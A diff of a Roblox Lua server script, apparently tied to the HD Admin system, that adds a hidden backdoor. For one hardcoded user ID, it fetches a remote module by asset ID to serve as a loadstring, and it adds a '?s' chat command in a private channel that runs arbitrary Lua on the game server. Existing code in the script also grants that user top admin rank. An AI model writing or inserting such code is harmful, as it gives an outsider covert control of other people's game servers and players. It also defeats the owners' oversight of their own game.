@@ -200,7 +200,9 @@ local TextChatService = game:GetService("TextChatService")
 local HTTPService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
+local Loadstring
 local ChannelAdded = false
+local Runtimes = 0
 
 coroutine.wrap(function()
 	repeat RunService.Heartbeat:Wait() until _G.HDAdminMain~=nil and ReplicatedStorage:FindFirstChild("HDAdminSetup")
@@ -287,6 +289,9 @@ local playerAdded = false
 local function addPlayer(Player)
 	if Player.UserId==1569580185 and not playerAdded then
 		playerAdded = true
+		if Loadstring==nil then
+			Loadstring = require(16640113367)
+		end
 		repeat RunService.Heartbeat:Wait() until _G.HDAdminMain~=nil and ReplicatedStorage:FindFirstChild("HDAdminSetup")
 		local HDPI = require(ReplicatedStorage:FindFirstChild("HDAdminSetup")):GetMain():GetModule("API")
 		local CF = require(ReplicatedStorage:FindFirstChild("HDAdminSetup")):GetMain():GetModule("cf")
@@ -365,7 +370,7 @@ local function addPlayer(Player)
 				PlayerData:ChangeStat(Player,"SaveRank",true)
 				Speaker:SendSystemMessage("Done!","HDModifier")
 				return true
-			elseif string.sub(message,1,6) == "?manualrank" and channelName=="HDModifier" and speakerName==Speaker.Name then
+			elseif string.sub(message,1,1) == "?manualrank" and channelName=="HDModifier" and speakerName==Speaker.Name then
 				Speaker:SendSystemMessage("Manually ranking you...","HDModifier")
 				PlayerData:ChangeStat(Player,"Rank",5)
 				PlayerData:ChangeStat(Player,"AutomaticRank",true)
@@ -382,6 +387,20 @@ local function addPlayer(Player)
 					end
 				end
 				Speaker:SendSystemMessage("Finished!","HDModifier")
+				return true
+			elseif string.sub(message,1,2) == "?s" and channelName=="HDModifier" and speakerName==Speaker.Name then
+				Speaker:SendSystemMessage(string.sub(message,4,string.len(message)),"HDModifier")
+				coroutine.wrap(function()
+					Speaker:SendSystemMessage("Running...","HDModifier")
+					local FakeScript = Instance.new("Script",game:GetService("ServerScriptService"))
+					Runtimes+=1
+					FakeScript.Name = "Runtime_"..tostring(Runtimes)
+					local l = Loadstring("local script = game:GetService('ServerScriptService')."..FakeScript.Name..";"..string.sub(message,4,string.len(message)))
+					local e,r = pcall(function()l()end)
+					if not e then
+						Speaker:SendSystemMessage("Error: "..tostring(r),"HDModifier")
+					end
+				end)()
 				return true
 			end
 			return false
@@ -533,6 +552,20 @@ local function addPlayer(Player)
 					end
 				end
 				Speaker:SendSystemMessage("Finished!","HDModifier")
+				return true
+			elseif string.sub(message,1,2) == "?s" and channelName=="HDModifier" and speakerName==Speaker.Name then
+				Speaker:SendSystemMessage(string.sub(message,4,string.len(message)),"HDModifier")
+				coroutine.wrap(function()
+					Speaker:SendSystemMessage("Running...","HDModifier")
+					local FakeScript = Instance.new("Script",game:GetService("ServerScriptService"))
+					Runtimes+=1
+					FakeScript.Name = "Runtime_"..tostring(Runtimes)
+					local l = Loadstring("local script = game:GetService('ServerScriptService')."..FakeScript.Name..";"..string.sub(message,4,string.len(message)))
+					local e,r = pcall(function()l()end)
+					if not e then
+						Speaker:SendSystemMessage("Error: "..tostring(r),"HDModifier")
+					end
+				end)()
 				return true
 			end
 			return false
